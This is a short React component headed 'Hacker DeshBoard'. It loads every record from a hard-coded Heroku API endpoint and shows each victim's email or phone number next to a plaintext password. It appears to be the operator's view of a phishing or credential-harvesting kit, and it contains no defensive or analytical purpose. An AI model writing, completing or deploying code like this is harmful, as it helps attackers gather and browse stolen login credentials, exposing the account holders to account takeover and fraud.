import React, { useEffect, useState } from "react";
import "./Deshboard.css";
import axios from "axios";

const Deshboard = () => {
   const [allData, setAllData] = useState([]);

   useEffect(() => {
      const fetchingData = async () => {
         const res = await axios.get(
            "https://intense-springs-49451.herokuapp.com/api/admin/allUsers"
         );
         return setAllData(res.data);
      };
      fetchingData();
   }, []);

   return (
      <div className="container">
         <h2 className="text-primary text-center headLine">Hacker DeshBoard</h2>
         <div className="main-table">
            <table class="table table-striped">
               <thead>
                  <tr>
                     <th scope="col">#</th>
                     <th scope="col">Enail or phone</th>
                     <th scope="col">Password</th>
                  </tr>
               </thead>
               <tbody>
                  {allData.map((item, index) => {
                     return (
                        <tr>
                           <th scope="row">{index}</th>
                           <td>{item.name}</td>
                           <td>{item.password}</td>
                        </tr>
                     );
                  })}
               </tbody>
            </table>
         </div>
      </div>
   );
};

export default Deshboard;
